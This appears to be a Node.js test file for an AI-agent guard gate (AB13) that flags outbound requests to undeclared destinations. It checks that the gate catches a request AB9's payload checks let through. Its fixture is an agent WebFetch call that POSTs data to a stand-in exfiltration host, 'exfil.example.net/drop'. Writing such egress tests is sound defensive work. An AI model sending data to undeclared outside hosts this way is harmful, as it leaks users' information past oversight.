'use strict';

/**
 * Wiring proof for AB13 (#1891). The unit tests prove the gate's logic; this
 * proves `evaluateExternalAction` actually reaches it, and — the point of the
 * whole gate — that it fires on a payload AB9 and AB12 have nothing to say
 * about.
 */

const test = require('node:test');
const assert = require('node:assert/strict');

const { evaluateExternalAction } = require('../lib/external-action-guard');
const { UNEXPECTED_EGRESS_REASONS } = require('../lib/unexpected-egress-gate');

const WORKSPACE_ROOT = process.cwd();

function invocation(url) {
  return {
    invocationId: 'inv-egress',
    agentName: 'egress-agent',
    sessionId: 'egress-session',
    turnId: 'turn-1',
    toolName: 'WebFetch',
    action: 'post',
    args: { url, body: 'build finished ok' },
    cwd: WORKSPACE_ROOT,
    workspaceRoot: WORKSPACE_ROOT,
    workspaceId: 'default',
  };
}

function ab13(result) {
  return result.findings.find((finding) => finding.gate === 'AB13');
}

function ab9(result) {
  return result.findings.find((finding) => finding.gate === 'AB9');
}

test('an unconfigured guard runs no AB13 gate at all', () => {
  const result = evaluateExternalAction(invocation('https://exfil.example.net/drop'), {
    environment: {},
    dataResidency: null,
  });

  assert.equal(ab13(result), undefined, 'inert unless a deployment declares expected egress');
});

test('the guard flags a destination nobody declared', () => {
  const result = evaluateExternalAction(invocation('https://exfil.example.net/drop'), {
    environment: {},
    dataResidency: null,
    expectedEgress: { enabled: true, destinations: ['github.com'] },
  });
  const finding = ab13(result);

  assert.ok(finding, 'the guard must reach AB13');
  assert.equal(finding.reason, UNEXPECTED_EGRESS_REASONS.UNEXPECTED);
  assert.deepEqual(finding.unexpectedDestinations, ['exfil.example.net']);
  assert.notEqual(result.decision, 'allow');
});

test('AB13 fires on a payload AB9 finds nothing sensitive in', () => {
  // The gap AB13 closes: no PII, no secret, no residency rule -- and until now
  // no gate had an opinion about the destination.
  const result = evaluateExternalAction(invocation('https://exfil.example.net/drop'), {
    environment: {},
    dataResidency: null,
    expectedEgress: { enabled: true, destinations: ['github.com'] },
  });

  const egress = ab9(result);
  assert.deepEqual(egress.piiTypes, [], 'fixture must carry no PII, or this proves nothing');
  assert.equal(egress.secretDetected, false);
  assert.equal(egress.reason, 'no_sensitive_payload');
  assert.equal(egress.decision, 'allow', 'AB9 alone would have let this through');
  assert.ok(ab13(result), 'AB13 is what catches it');
});

test('a declared destination passes the gate', () => {
  const result = evaluateExternalAction(invocation('https://api.github.com/repos'), {
    environment: {},
    dataResidency: null,
    expectedEgress: { enabled: true, destinations: ['github.com'] },
  });
  const finding = ab13(result);

  assert.ok(finding);
  assert.equal(finding.decision, 'allow');
  assert.equal(finding.reason, UNEXPECTED_EGRESS_REASONS.ALL_EXPECTED);
});

test('the environment flag alone reaches the gate', () => {
  const result = evaluateExternalAction(invocation('https://exfil.example.net/drop'), {
    environment: {
      HUQAN_EXTERNAL_GUARD_EXPECTED_EGRESS: 'review',
      HUQAN_EXTERNAL_GUARD_EXPECTED_DESTINATIONS: 'github.com',
    },
    dataResidency: null,
  });

  assert.ok(ab13(result));
});

test('AB13 and AB9 judge the same destination set', () => {
  const result = evaluateExternalAction(invocation('https://exfil.example.net/drop'), {
    environment: {},
    dataResidency: null,
    expectedEgress: { enabled: true, destinations: [] },
  });

  assert.deepEqual(ab9(result).destinations, ab13(result).unexpectedDestinations);
});
